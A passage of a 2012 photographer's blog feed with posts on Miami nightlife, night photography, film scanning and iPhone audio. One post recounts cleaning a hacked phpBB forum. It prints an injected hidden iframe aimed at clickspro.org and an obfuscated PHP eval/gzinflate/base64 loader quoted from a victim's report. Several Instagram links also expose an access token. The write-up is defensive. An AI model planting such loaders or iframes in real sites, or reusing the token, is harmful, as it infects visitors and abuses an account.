<p>I still have to figure out how to derive that media_id without having to manually kick the Instagram API. If anyone knows how, let me know.</p>

<p>That being said, I definitely had &#8220;more creative energy&#8221; by that Saturday night. Some plans for early hours didn&#8217;t materialize. I was supposed to attend a bachelor/bachelorette party at Scarlett&#8217;s up in Hollywood, but the &#8220;confirmation&#8221; message never arrived that the people were actually gonna go. By then, it was 1:30 in the morning and I was already framing my mind from staring at desperate girls on the pole to actually doing something productive. So, I kind of said &#8220;the hell with it&#8221;, jumped into a <a href="http://miami.car2go.com/">Car 2 Go</a>, and drove on over to Space.</p>

<p><a href='http://www.dan-vidal.com//blog/2012/10/07//' data-instagram-url='http://instagr.am/p/QeHL8FAgAh/' class='instagram-image'><img src='http://distilleryimage5.s3.amazonaws.com/88cd369e104511e2b7ea22000a1fc2ec_7.jpg' alt='Saddle up. @car2gomiami to @clubspacemiami' height='612' width='612' /></a><br/>Filtered with <a href='http://www.dan-vidal.com//blog/categories/normal'>Normal</a> through <a href='http://www.dan-vidal.com//blog/categories/instagram'>Instagram</a></p>


<!--more-->


<p><a href='http://maps.google.com?q=25.835181305,-80.182557106'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=25.835181305,-80.182557106&markers=25.835181305,-80.182557106&zoom=14&size=612x200&sensor=false' alt='Talk Nightlife' /></a><br/>Taken at Talk Nightlife</p>


<p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73&response_type=token&scope=likes+comments' id='296706232201379873_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p>


<p>Car 2 Go is saving me so much money in cab fare. It&#8217;s amazing. Plus, they never thought of my use case until I told them. They posted on Facebook about using their service to get to the Brickell Oktoberfest party, and taking the safe way (a cab) home. Agalmic cowboy diplomacy.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/lostios2012-9217.jpg" width="960" height="640" title="'Hi Jordyn'" ></p>

<p>Anyways, Space was the usual &#8216;rock&#8217; of Miami nightlife this past weekend. Great atmosphere, an interesting crowd, and great music. It&#8217;s not a trendy VIP club, and it doesn&#8217;t aspire to be. In my mind it&#8217;s the heart of Miami nightlife. It is one venue you can go to without even bothering to check their website to see who is playing. A friend of mine suggested that their marketing campaign should be &#8220;Space: We&#8217;re fucking open.&#8221;</p>

<p>I did my usual rounds at the venue, including switching out to the 50 1.2 L as the morning rolled on. It&#8217;s a learning curve, but one I&#8217;m glad to participate in. It&#8217;s a great lens and you can do amazing things with it wide open. Every Canon user should have it in their arsenal.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/lostios2012-9335.jpg" width="960" height="640" title="'Lucy I'm Home'" ></p>

<p>At 1.2, you will have throwaway images. Nature of the beast in a nightclub. Just keep shooting, but don&#8217;t turn it into a Golden BB spray-and-pray affair. If the shot doesn&#8217;t happen, it doesn&#8217;t happen.</p>

<p>I left a little after 9 AM Sunday morning. I woke up Sunday afternoon, since I had a Keys trip planned, but the weather totally did not cooperate. I ended up turning around on the Turnpike Extension after a huge downpour kicked in, with more forecast for Monday. Though Monday turned out to be a rather nice day. Such is luck I guess.</p>

<p>I&#8217;ll try to make it down again in the next few weeks. Maybe after Halloween Weekend.</p>

<p>Totally random weekend.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Out Where The Buses Don't Run...]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/10/05/out-where-the-buses-dont-run-dot-dot-dot/"/>
    <updated>2012-10-05T15:07:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/10/05/out-where-the-buses-dont-run-dot-dot-dot</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/outwhere_rev-8882.jpg" width="960" height="640" title="'US 27 Northbound Broward County'" ></p>

<p>If you really want to get out into where it gets dark, you should probably head north and west along US 27 if you live or are shooting in the metropolitan Miami area&#8230;</p>

<!-- more -->


<p>It&#8217;s definitely out where the buses don&#8217;t run.</p>

<iframe width="" height="" src="http://www.youtube.com/embed/hIv-YaVBtA8 " frameborder="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>


<p>I miss Miami Vice.</p>

<p>You&#8217;ll see a bit of the old South Florida when you get out that way. Before the sprawl and the overdevelopment.</p>

<p>This image was done with my 50 1.2 L. So far, so good. I&#8217;m definitely happy with the purchase. Prime lenses give you that extra five percent in overall image quality, and the 50 doesn&#8217;t disappoint in this regard.</p>

<p>This is a 30 second exposure from the side of US 27 heading northbound just over the county line into Broward. There was a small amount of moonlight partially obscured by clouds. The rest is all ambient light, including airglow, the distant Miami city lights, and the lights of passing vehicles.</p>

<p>I&#8217;m sure the truckers were wondering what I was doing at 1:30 in the morning on the side of the road. Protip, bring a flashlight, and just point it at the ground when vehicles are coming close.</p>

<p>I&#8217;ll be putting this one up for sale soon at my <a href="http://dan-vidal.fineartamerica.com/">FAA</a> site.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Film might be archival, but...]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/10/04/film-might-be-archival/"/>
    <updated>2012-10-04T01:53:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/10/04/film-might-be-archival</id>
    <content type="html"><![CDATA[<p><a href='http://www.dan-vidal.com//blog/2012/10/04//' data-instagram-url='http://instagr.am/p/QWWPj8AgIZ/' class='instagram-image'><img src='http://distilleryimage1.s3.amazonaws.com/ea00a4d40de611e28b0122000a1f8e95_7.jpg' alt='The man @tiesto in 2002 #wmc #miami - hah Nick set this one up for me, told me to see "this guy" at some hotel on the beach. #throwbackthursday' height='612' width='612' /></a><br/>Filtered with <a href='http://www.dan-vidal.com//blog/categories/lord kelvin'>Lord Kelvin</a> through <a href='http://www.dan-vidal.com//blog/categories/instagram'>Instagram</a></p>


<!--more-->


<p><a href='http://maps.google.com?q=25.788277,-80.130787'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=25.788277,-80.130787&markers=25.788277,-80.130787&zoom=14&size=612x200&sensor=false' alt='Aqua Hotel' /></a><br/>Taken at Aqua Hotel</p>


<p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73&response_type=token&scope=likes+comments' id='294520652042469913_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p>


<p>Even though I think social networking is mainly a lot of hype, snake oil, and the dumbing down of the narcissistic masses even further, I&#8217;ll gladly admit my addiction to Instagram. At least to do something meaningful with it, you have to overcome the limitations of your iPhone camera, and go for what&#8217;s there. It&#8217;s part of the challenge, to me. Plus, I like the UI and the way it sends your photo while you think of some pithy caption, so it almost appears to upload at warp speed.</p>

<p>There&#8217;s a trend on Instagram, called &#8220;Throwback Thursday&#8221;. Well, it&#8217;s Thursday right now. So I like to do throwbacks when I can.</p>

<p>I first saw this when I jumped on Instagram a few months ago. People would post photos from their past, and call them &#8220;throwbacks&#8221;. Now, of course, the limit of the throwback is tied to the age of the image that is being posted. And, most images being posted are straight from a digital source. And unless you were in the photo biz, you had no easy way to digitize your old film shots.</p>

<p>When I shot film, I had a film scanner. Not a flatbed to scan prints, which was essentially making second-generation copies, but a full-on &#8220;digital enlarger&#8221;, which actually had 1/3 the resolution of my current digital SLR, oddly enough. It was a Minolta unit, which actually was old when I bought it, and required me to get an equally-old <em>SCSI</em> (remember SCSI?) adapter card for my homebuilt PC to make it work. It was painfully slow. An average photo session from a club took about 3 hours to scan in if I wanted the proper results.</p>

<p>As time went on, I obviously upgraded to digital (in mid-2003 no less!) with a Canon 10D DSLR. I stowed my Minolta scanner, and actually never touched it again. By the time it occurred to me that maybe I&#8217;d want a film scanner to bring back some of those old archived images, it was well past the time when I even had a desktop PC with which it could be used. I had migrated to Apple, and obviously my Macbook had only USB and Firewire ports. Yes, I know Nikon, Imacon, and others make USB and Firewire film scanners, but, economies of scale did not touch them, and they were still as expensive and as rare as the days they were a common item in professional photo labs around the world. There were some cheap brand-X scanners on eBay, but the results were disappointing. And I wasn&#8217;t about to ship my negatives and chromes to New York, just to have them scanned in. No one is asking for the old stuff for any commercial reasons, anyways, i.e. I couldn&#8217;t warrant a film scanner purchase just for social media use.</p>

<p>Now, I know what is being asked, &#8220;Hey, Pod, didn&#8217;t you save the files you made from the scans?&#8221;</p>

<p>Well, actually I only saved the final JPEG files, which in those days I only saved them at 320 px across in the long dimension to fit the specs for CJ. It wasn&#8217;t worth saving the TIFF files since if I was printing, I would just do it at the pro lab I worked at at the time on their Frontier system or traditional darkroom. And the only reason to go to TIFF was for archival reasons, and if you had the negs and chromes (which I do), you already had an archive. However, that archive might as well be on the moon as far as quickly accessing it is concerned.</p>

<p>That being said, I did a fun trick for the Tiësto image at the start of this article. That one is from 2002. Nick sent me out to this Nettwerk America record label event at the Aqua Hotel on Collins Avenue, to take photos of &#8220;this Tiësto guy&#8221;, while a writer he drafted interviewed him. Hah, the days of real interviews.</p>

<p>Anyways&#8230;what I did to get this &#8220;digital&#8221; was that I made a pure white block on my Macbook Air&#8217;s monitor, and laid the chrome of Tijs over it. The white light shines through the chrome, making it visible. Then I used my iPhone camera to take a photo of the chrome laid over the white block. Insta-lightbox-low-res-social-media-scanner. And if you want to do a &#8220;scan&#8221; of a negative, you just do the same thing, export to Photoshop, invert the colors, do some balancing, and you&#8217;ve got yourself a quick and dirty capture of an old analog image. It&#8217;s not Imacon quality (but then again, what else is?), but to impress all your friends and mindless followers on Instagram, it&#8217;s definitely sufficient. A step up would be to rig up your DSLR and do it at a higher resolution. However, then you are picking up the individual elements of the screen unless you have a Retina display. At that point you should probably just secure a lightbox from eBay. Hmm, wait&#8230;</p>

<p>Since this blog is partially educational, I&#8217;m putting this idea out to the community free of charge. All I ask is if you use this technique, just tag your Instagrams with #podscan and @pod_gram. Attribution is always welcome, and it&#8217;s what people used to do. Your image and caption can be a throwback!</p>

<p>Happy Throwback Thursday.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Getting the best sound from your iDevices.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/10/03/getting-the-best-sound-from-your-idevices/"/>
    <updated>2012-10-03T01:28:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/10/03/getting-the-best-sound-from-your-idevices</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/eq.jpg" width="640" height="960" title="'EQ'" ></p>

<p>Being able to take a significant portion of, or the entirety of, your audio library on the road is a wonderful thing. Of course the primary means of doing this for most people is via their iPhone, iPod, or iPad. And, I suppose, some people draft their Android devices into unwilling audio playback devices. And there&#8217;s probably one person who uses their BlackBerry for this function, maybe. Regardless, iDevices reign supreme nowadays for mobile audio. And, Apple themselves have a host of applications for the Mac, dedicated to making the best audio possible.</p>

<p>Then, why are the default audio optimization options for iOS so miserable?</p>

<!-- more -->


<p>That does baffle me. Apple, as a company, develops and produces applications like <a href="http://www.apple.com/logicpro/">Logic Pro</a>, which is a well-regarded audio production application. But I guess that side of the house doesn&#8217;t liase with the side of Apple dedicated to their mobile devices. The EQ options never are 100% perfect, and the included earbuds, even the new &#8220;EarPods&#8221;, are horrendous.</p>

<p>So, what&#8217;s a picky audiophile on-the-go to do?</p>

<p>Surprisingly, car audio is easy. Any decent head unit nowadays has an iOS-compatible USB port, and some manufacturers include iOS compatibility in their stock systems. The huge advantage here is that your iDevice turns into a mere storage unit, and all the decoding and heavy lifting is done in the head unit of your car.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/dof-7823.jpg" width="960" height="640" title="'DEH-4400'" ></p>

<p>In general, the digital-to-analog converter (DAC) in your car&#8217;s head unit, is superior in quality to the one that ships with an iDevice. It&#8217;s a $2 part, that probably does a lot of other things as well, in your iPod, and in your Pioneer head unit, for example, it&#8217;s a $10 discrete component. The advantage here is that your iDevice sends the audio as pure data, and you can then use your head unit&#8217;s more precise EQ (even a three-band one helps!) for better audio quality.</p>

<p>Now, we&#8217;re not always in our cars when we&#8217;re on the go. In an urban area we might be on a bus, walking, jogging, or cycling. Fortunately, one can acquire a decent pair of earbuds for under $60. I&#8217;m not going to really argue which one is superior here, since everyone&#8217;s hearing is different. I personally use the <a href="http://www.polkaudio.com/products/ultrafit500">Polk Audio UF500s.</a> They come with several bud attachments so they&#8217;re not flying away in the middle of a workout, for example. At a certain point a headphone is a headphone is a headphone when it comes to in-ear types. If I&#8217;m doing critical listening I&#8217;ll have a pair of studio cans like the Sony MDR-7509s (say no to celebrity headphones!) handy.</p>

<p>But, even the best headphones need a good signal to work with it. And on an iDevice, the default EQ options don&#8217;t cut it. So I did some poking around, and i found several apps. The one that &#8220;stuck&#8221; with me the most was <a href="http://itunes.apple.com/us/app/equ-the-quality-equalizer/id403704212?mt=8">EQu</a>.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/ozz.jpg" width="640" height="960" title="'EQu'" ></p>

<p>Developed by <a href="http://www.elephantcandy.com/">elephantcandy</a> out of Amsterdam, EQu gives you a full graphic-equalizer control for your iDevice. You can use one of the many available preset EQ curves, or roll your own. I like crisp lows and well-defined highs (without getting too technical), and this little app let me do it. Your iOS presets usually sacrifice one for the other. But this app gives you full control, beyond even having a bunch of faders. In a nutshell, I get decent quality audio, while I&#8217;m on the go. More than sufficient for mobile use. I won&#8217;t power a sound system out of my headphone port with this app, but I&#8217;ll gladly use this while running or cycling. The app was last updated in July of 2012, so while it isn&#8217;t explicitly optimized for the iPhone 5 or iOS 6 yet, it will work on the 5, or a device running iOS 6. The developer appears to still be in business, so I&#8217;m sure a new version is forthcoming.</p>

<p>But, that being said, it does reveal one weakness, and that&#8217;s the inherent flaws in the files themselves. I&#8217;ve noticed on some of my songs purchased from the iTunes Music Store, that the low end tends to distort when amplified. You can actually view this in action on the app, it will flash red if the signal is peaking in any respect. However, I do have some straight WAV files from Beatport, which come through with their full fidelity in this app. The app definitely exposes the weaknesses of compressed audio. Shit in, shit out, as they say. Also, the app only works with your music files. Any other audio from any other app/source on your iDevice is subject to the defaults in iOS.</p>

<p>Some users report increased battery consumption with this app. That may be the case, but I&#8217;m usually never using it for more than two hours, and it performs just fine in my unscientific testing. Also, any ITMS file purchased before 2009 may not play back due to Apple&#8217;s DRM at the time, since the app is it&#8217;s own audio player, and not an EQ for the existing iOS playback app.</p>

<p>A third option exists, for the truly hardcore mobile audiophiles, the <a href="http://v-moda.com/vamp/">VAMP by V-MODA</a>. I had the pleasure during the 2009 Tiësto tour to spend time with Val Kolton, the founder of V-MODA, and he definitely takes his audio seriously. The Vamp reflects this. It&#8217;s an external DAC/amplifier for the iPhone/iPod, and also acts as a battery too. However, at $600, it&#8217;s a little rich for my blood. And there&#8217;s no model for the iPhone 5 yet. I may live a little and consider it after I upgrade, it seems like a badass option, and there are occasions where I&#8217;m around the apt and not wanting to disturb the neighbors with my speakers, but I do want mobility. Or for when I&#8217;m on a plane and have a pair of 7509s. I love the concept, but I&#8217;ll reserve judgement until they roll one for the 5.</p>

<p>But, for those of us on a budget, a good pair of earbuds, and the EQu app are a great combo for when you&#8217;re on the go. It&#8217;s just too bad you have to spend extra money, whether it&#8217;s for a head unit in your car with a USB port, the combination of EQu and a decent pair of earbuds, or going full-throttle with a VAMP, to get decent audio out of your iDevice. Apple has the chops in pro audio, it should trickle down to their iDevices. At the least, give us a systemwide graphic equalizer.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[From the weekend.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/10/02/from-the-weekend/"/>
    <updated>2012-10-02T18:10:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/10/02/from-the-weekend</id>
    <content type="html"><![CDATA[<p><a href='http://www.dan-vidal.com//blog/2012/10/02//' data-instagram-url='http://instagr.am/p/QS2YLLAgEN/' class='instagram-image'><img src='http://distilleryimage9.s3.amazonaws.com/a37577d60cd511e2968922000a1cdbb3_7.jpg' alt='Scenes from @nicolemoudaber @clubspacemiami @kryogenifex' height='612' width='612' /></a><br/>Filtered with <a href='http://www.dan-vidal.com//blog/categories/normal'>Normal</a> through <a href='http://www.dan-vidal.com//blog/categories/instagram'>Instagram</a></p>


<!--more-->


<p><a href='http://maps.google.com?q=25.784715407,-80.193181247'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=25.784715407,-80.193181247&markers=25.784715407,-80.193181247&zoom=14&size=612x200&sensor=false' alt='Club Space' /></a><br/>Taken at Club Space</p>


<p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73&response_type=token&scope=likes+comments' id='293536081507385613_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p>


<p>It wasn&#8217;t a bad weekend. Seenightlife is barfing right now. It&#8217;ll be back up soon!</p>

<p>It happens, and I&#8217;ll learn something from it.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[I like Vimeo.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/28/i-like-vimeo/"/>
    <updated>2012-09-28T14:11:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/28/i-like-vimeo</id>
    <content type="html"><![CDATA[<iframe width="" height="" src="http://player.vimeo.com/video/46506653 " frameborder="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>


<p>Vimeo is the superior video sharing platform, in my opinion.</p>

<p>Why?</p>

<!-- more -->


<p>It plays your content, and gets out of the way. Anything beyond that is up to you.</p>

<p>And yes, the plugin works.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[A little mix to kick off the weekend...]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/28/a-little-mix-to-kick-off-the-weekend-dot-dot-dot/"/>
    <updated>2012-09-28T11:23:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/28/a-little-mix-to-kick-off-the-weekend-dot-dot-dot</id>
    <content type="html"><![CDATA[<p>Well, I figured out the audio player thing. Just a little work with the includes was all I needed to do to make it all come together&#8230;</p>

<!-- more -->


<p>So, with that, I&#8217;m gonna post a mix for you all to enjoy. This one, is done by some friends of mine, the duo <a href="https://www.facebook.com/DJSESSANDEMM">Ess &amp; Emm</a>. Sasha and Michelle mix up some nu-disco and more for your listening enjoyment. Press play, the audio player works! And yes, all things considered, if I was a DJ, I&#8217;d play nu-disco. Just the way it is.</p>

<p/>
<center>
<audio src="https://s3.amazonaws.com/dvblog/essemm.mp3" preload="none" />
</center>
<p/>

They will be providing the soundtrack this evening at Chalk, just in time for the <a href="http://forum.talknightlife.com/viewtopic.php?f=3&t=20004">TNL 5th Anniversary</a> Unofficial Official Party. Hell, it&#8217;s technically their party, &#8220;Beaver Feaver&#8221;, we&#8217;re just imposing on it. Sorry about that, girls. But that&#8217;s how we roll.

<img class="center" src="https://s3.amazonaws.com/dvblog/bf.jpg" width="621" height="960" title="'BF'" >

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Audio.]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/28/audio/"/>
    <updated>2012-09-28T01:14:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/28/audio</id>
    <content type="html"><![CDATA[<p/>
<center>
<audio src="https://s3.amazonaws.com/dvblog/1620.mp3" preload="none" />
</center>
<p/>

Does this work? Maybe it needs to be initialised.

<!-- more -->

And we have audio!

Thank you to <a href="http://blog.micronarrativ.org/blog/2012/09/06/wordpress-til-octopress-audio">Daniel at Micronarrativ</a> for the initial work. 

I knew there had to be a simple audio player. 

Now I&#8217;m gonna go post a mix. 

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[On clicks, likes, and impressions...]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/27/on-clicks/"/>
    <updated>2012-09-27T23:34:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/27/on-clicks</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/sneakz.png" width="960" height="472" title="'cURL'" ></p>

<p>Every so often, websites are hacked. Sometimes it&#8217;s bad, sometimes it&#8217;s harmless. The usual goal is to infect a viewer&#8217;s computer with malware, perhaps to join a botnet or something to that effect. Though the ones that fall under the category of &#8220;harmless&#8221;, are actually quite annoying. They are usually trying to drum up clicks, likes, and impressions on a specific site.</p>

<p>And this, ladies and germs, is why the statistics on clicks, likes, and impressions is such a skewed game these days. You can&#8217;t trust them&#8230;</p>

<!-- more -->


<p>Why not?</p>

<p>Well, case in point. TNL was hacked a few days ago. It happens sometimes. The webhost, <a href="http://dreamhost.com/">Dreamhost</a> for TNL is known far and wide for it&#8217;s cheap and bargain-basement hosting. And they pretty much give you unlimited everything for a few dollars a month. Now, they usually don&#8217;t add scads of hardware to their clusters to do this, but they subdivide what they already have, much like a cheap motel. With all this subdividing comes a lot of issues, most notably the ability for hackers and script kids to &#8220;peer over the walls&#8221;, as it were, and observe what else is going on on a given server. TNL resides on a shared host, with hundreds of other sites. TNL in and of itself is secure, but it&#8217;s hard for us to enforce the security when the walls built by the host are not secure, and we do not have the permission to reinforce those walls.</p>

<p>So, people invariably get in.</p>

<p>I first noticed something was amiss when I could not login to the forum&#8217;s administrative control panel. Well, I could login, but the page failed to render properly. I then noticed some suspicious redirects going on in my browser&#8217;s status bar. The redirects were pointing towards a site called &#8220;clickspro.org&#8221;. Now, since I helped build TNL, I know each and every aspect of it&#8217;s functionality. And, clickspro.org was not part of that functionality. Plus, Ryan would not have implemented something new on TNL, since he is not really paid to do that, and if he did, he would have notified me, especially considering it&#8217;s been over three years since TNL has explicitly seen any new features.</p>

<p>So, I started a little investigating.</p>

<p><strong>Disclaimer: I am not a real computer security expert. I just know things and get by with a little help from my friends. I assume no liability for what is below. Posting this to help the community. YMMV. Thanks!</strong></p>

<p>Random things of this nature have happened before, and usually the culprit is a line or two of code that is inserted at the top of a page. This code typically points to malware, but in this case, it didn&#8217;t. I used the UNIX tool &#8220;cURL&#8221; to investigate. cURL will render an HTML document in your Terminal window at the code level. cURL is basically a command-line browser.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>podbookair:podpress pod$ curl http://forum.talknightlife.com/adm/index.php?sid=1c88841aa35bdee4c5aafca116f06513</span></code></pre></td></tr></table></div></figure>


<p>This rendered the admin control panel for TNL in it&#8217;s raw HTML format. Therein, I spotted the offending code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;iframe width="10" height="10" style="visibility:hidden;position:absolute;left:0;top:0;" src="http://click.clickspro.org/feed/frames.php?uid=56&frames=3">&lt;/iframe></span></code></pre></td></tr></table></div></figure>


<p>That does not belong.</p>

<p>So, I Googled various iterations of the offending code. This turned out to be a fairly new attack that PHP-based web applications were falling victim to, and not much was known about it other than it being benign and not malicious in intent.</p>

<p>I had an email exchange with Ryan on the subject, and he suggested it was involving Javascript. As it was late, the conversation kind of ended there. TNL was still functioning, but I was locked out of the cockpit, as it were.</p>

<p>The next day I chose to follow his line of reasoning. I looked around for Javascript files that did not belong. TNL is a complex, poorly-documented machine. Our fault, but it is what it is. I didn&#8217;t find anything of note. The only Javascript files were legit, and needed for the operation of TNL.</p>

<p>I got back to Google. I found a random forum posting on the subject at that point, over on the <a href="http://community.mybb.com/thread-126714-post-917538.html#pid917538">support site for MyBB</a>, which is a cousin of phpBB, the software that drives TNL.</p>

<blockquote><p>Same here, damn idiot hacker writes into my WordPress index.php files these lines</p><footer><strong>adormind</strong> <cite><a href='http://community.mybb.com/thread-126714-post-917538.html#pid91753'>Unknown Iframe on Index Page, Site Redirecting to Other From Mobile</a></cite></footer></blockquote>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php 
</span><span class='line'>
</span><span class='line'>eval(gzinflate(base64_decode('7L0HYBxJliUmL23Ke39K9UrX4HShCI
</span><span class='line'>
</span><span class='line'>BgEyTYkEAQ7MGIzeaS7B1pRyMpqyqBymVWZV1mFkDM7Z28995777333nvvvf
</span><span class='line'>
</span><span class='line'>e6O51OJ/ff/z9cZmQBbPbOStrJniGAqsgfP358Hz8iivN063ctmiZvt36387
</span><span class='line'>
</span><span class='line'>a8c+cXpxdlNcnKFH8e4p/Pdg9/4+THfiyv66r+/et8VdVtsbzY2rnDH6/qYt
</span><span class='line'>
</span><span class='line'>luffy4OK+zRZ5eFbN2/tlHuzsfpfO8uJi38nvTXpf5Zx9dFk0xKcqivX40L2
</span><span class='line'>
</span><span class='line'>azfHm4qpqiLarlo2zSVOW6zQ/L/Lx9tHPYViv6l96sp599NG/b1aO7d6dlMX
</span><span class='line'>
</span><span class='line'>075n+bVV2Nq/ri7nmez+5y3814NV/9Huti9tn9T3+hfPLZvY+OHt8V1I4+Bs
</span><span class='line'>
</span><span class='line'>K/5DdO/p8AAAD//w==')));?></span></code></pre></td></tr></table></div></figure>


<p>Basically, it seems that it is possible to execute a Javascript function, and obfuscate it through base64. I&#8217;m not the best at security, but I remembered base64 from my USENET days, where files were encoded in that manner to facilitate speedy transmission and also ensure a modicum of obscurity. In a nutshell, USENET kids transferred porn this way to keep it on the down-low. If you don&#8217;t know what USENET is, Google it.</p>

<p>So, with this knowledge, I looked at some of our PHP files. I was SSHed into TNL directly, and used nano, a basic text editor, to view the offending files.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hawks:~/talknightlife.com/forum> nano index.php</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="https://s3.amazonaws.com/dvblog/score.png" width="960" height="480" title="'Score!'" ></p>

<p>That garbage up top is the base64-encoded Javascript which was causing my issue. Deleted it. Saved, and my ACP functionality was restored.</p>

<p>TNL continues on as normal. Happiness is restored to the gossip shop. Thanks to Ryan for pointing me in the right direction.</p>

<p>What mystifies me though, and I&#8217;m finally getting to the point of this rant, is that to implement this, it took some doing. This wasn&#8217;t a ten-second hack. Some damn kid in Manila took probably about a half-hour or more to do this, all for the sake of putting a script on TNL which would generate only a few random clicks to some weird website elsewhere.</p>

<p>A lot of effort, for little return. Clicks, likes, and impressions. It&#8217;s all a bullshit game. Your site has 100000 hits. So what? How does that convert to something tangible? If it&#8217;s an ecommerce site, are people buying anything? If it&#8217;s a site based on content, are people reading it? What is the meaningful metric? Oh, you have 100000 fans on Facebook? So? You only know their names, if that! Facebook took away the ability to easily browse your fanbase years ago. That number is equally meaningless. And now you have to pay Facebook to broadcast your message to all of them. Which is good for Facebook, but not-so-good for you. Statistics on web properties are always hideously inflated. To be impressed by those numbers is foolish. I would rather have 1000 people who really are engaged by my content and my product, than 50000 people who only clicked because they were told to, or if those clicks were the result of a script.</p>

<p>It&#8217;s sad that people actually pay for this sort of thing. It&#8217;s why my tactic with regards to web properties I don&#8217;t explicitly own or have control over is to get people off them as fast as possible. I&#8217;ll use social media to my advantage, but my final tactic is to get people off of the social media network, and right where I can get at them one-on-one, i.e. on this very blog, or over on TNL. For the record I don&#8217;t harvest emails for marketing or spam. I tend to let people contact me. I value the interaction bought about by someone who is genuinely interested in what I am saying or selling. I&#8217;d rather have that one loyal follower who will stay with me through the years because I treat them right and with respect, rather than as a commodity. I guess I&#8217;m the boutique shopkeeper with the little store off to your right, rather than the Wal-Mart. I don&#8217;t play the stats game. I&#8217;ve opted out. I get a few score viewers here on a daily basis. But I know them, or at least of them. We have a dialog, a real relationship. Not a bunch of meaningless egocentric clicks and likes.</p>

<p>Besides, my real followers, when they do choose or need to do business with me, pay real money. The pennies from clicks and likes may add up over time, but the methodology is dishonest and distasteful. And, even if I didn&#8217;t find it so, it&#8217;s really annoying.</p>

<p>Give me the real data and content.</p>

<p>And to the kid in Manila? Sorry about that. I know you&#8217;re just doing your job, and it&#8217;s better than the alternative of street prostitution, but I have to look after my interests. If I could pay it forward, I would. Maybe I am, by doing my little part in kicking down the clicks conspiracy.</p>

<p>Sidebar: If you are here searching for the solution to the jsunpack base64 clickspro problem, welcome! Take a look around after you are done fixing your systems.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[More on the Canon 50 1.2 L]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/09/27/more-on-the-canon-50-1-dot-2-l/"/>
    <updated>2012-09-27T11:53:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/09/27/more-on-the-canon-50-1-dot-2-l</id>
